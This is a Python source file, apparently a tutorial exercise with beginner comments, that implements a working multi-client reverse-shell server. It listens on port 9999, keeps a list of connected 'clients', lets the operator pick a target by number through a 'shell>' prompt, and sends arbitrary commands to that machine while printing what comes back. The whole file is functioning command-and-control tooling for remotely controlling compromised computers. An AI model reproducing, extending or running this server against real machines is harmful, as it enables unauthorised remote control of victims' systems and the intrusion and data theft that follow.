import socket
import sys # used to implemnt the command line and terminal command into our python file
import threading
import time
from queue import Queue

NUMBER_OF_THREADS=2
JOB_NUMBER=[1,2] # this is the thread nu
queue=Queue()

all_connections=[]
all_address=[]
# to create a socket (connect two computers)
def create_socket():
# after we define this function we need to declare 3 gloabls variable
    try:
        global host
        global port
        global s # s stands for socket
        host=""
        port=9999 # this is a unused port
        s=socket.socket()  # this is the function to create the socket

    except socket.error as msg:
        print("Socket creation error: "+str(msg))

# binding the socket and listening for connections

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port: "+str(port))

        s.bind((host,port)) # (this is known as tupile and inside this bracket we will contains the(bind,port))

        s.listen(5)#here we are listing it and it is imp because there is a server and 
        #  then there is a client. now to connect client to server , server should continoulsy liting to the server  
        # here 5 represent the nu of connections it is going to tolerate after which it will going to throw the error

    except socket.error as msg:
        print("Socket binding error: "+str(msg)+"\n"+"Retrying...")
        bind_socket() # it will again call the function if error occurs

# Establish connection with a client (socket must be listening)

#handling connections from multiple clients and saving to a list
#closing previous connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn,address=s.accept()
            s.setblocking(1) # prevents time out from hapening 

            all_connections.append(conn)
            all_address.append(address)

            print("connection has been established"+address[0] ) # we are just printinf the ip to see the conn has been established or not
        except:
            print("error accepting connections")

# 2 thread function -1) see all the clients 
#2) select a client 3) send commands to that client 
#interactive prompt for sending the commands
#shell>list -> it show list of conn
#0->client id  friendA->client b
#1 friendB
def start_shell():
   
    while True:
        cmd=input('shell> ')#this will create the custom shell for us 
#now we check the imput given by the user of the server.py file that can be us or some random hacker
#is equal to list or not . and if it is equal to list then we are going to show
#in  a list kind of format all the computers that is all the clients that are connected server.py 
        if cmd == 'list':
        # here we write the function which shows us all the clients
            list_connection()
        elif 'select' in cmd: 
            conn=get_target(cmd) # it will return the collection object that we store in conn
            if conn is not None:
               send_target_commands(conn)
        else:
            print("commnad not recognized")

#Display all current active connections with the client 
def list_connection():
    results = ''

    #select_id=0 #this is the select id
    # for conn in_all_connections:
    #     select_id+=1
    #we can do above 2 steps as
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)# 20480 is byte chunk size
        except:
            del all_connections[i]
            del all_address[i]
            continue #it ignore all of the code that is below it and it goes to the next itration of the loop

        results=str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
        # all_address[i][0] i is for iteration and 0 is beacuse the ip address is stored in the  first element of the list and 1 ia for port number
        #1 ip address portnumber ->format of result to displayed

    print("-----Clients----"+"\n"+results)

#select the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '') #target=id
        target=int(target)
        conn=all_connections[target]
        print("you are now connected to :"+str(all_address[target][0]))
        print(str(all_address[target][0])+">",end="")
        #ip address >
        return conn
    
    except:
        print("selection not valid")
        return None


def send_target_commands(conn):
    while True:
        try:
            cmd=input()
            if cmd =='quit':
                break
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_respone=str(conn.recv(20480),"utf-8")
                print(client_respone,end="")
        except:
            print("Error sending commands ")
            break
 # create worker thread   
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t=threading.Thread(target=work)
#threading.Thread is actually creating the thread
#and inside it, it's saying hey you have created the thread but 
#what kind of work do you want this thread to do
        t.daemon=True
# daemon tells the program that whenever the program ends make sure that the
#thread also ends 
        t.start()

#do next job that is in th queue and it's going to handle two threads
#the first thread is going to just handle connections 
#the second thread is actually able to send commands when it is connected to a specific client 

def work():
    while True:
        x=queue.get()
        if x==1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x==2:
            start_shell()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    
    queue.join()

create_workers()
create_jobs()
  
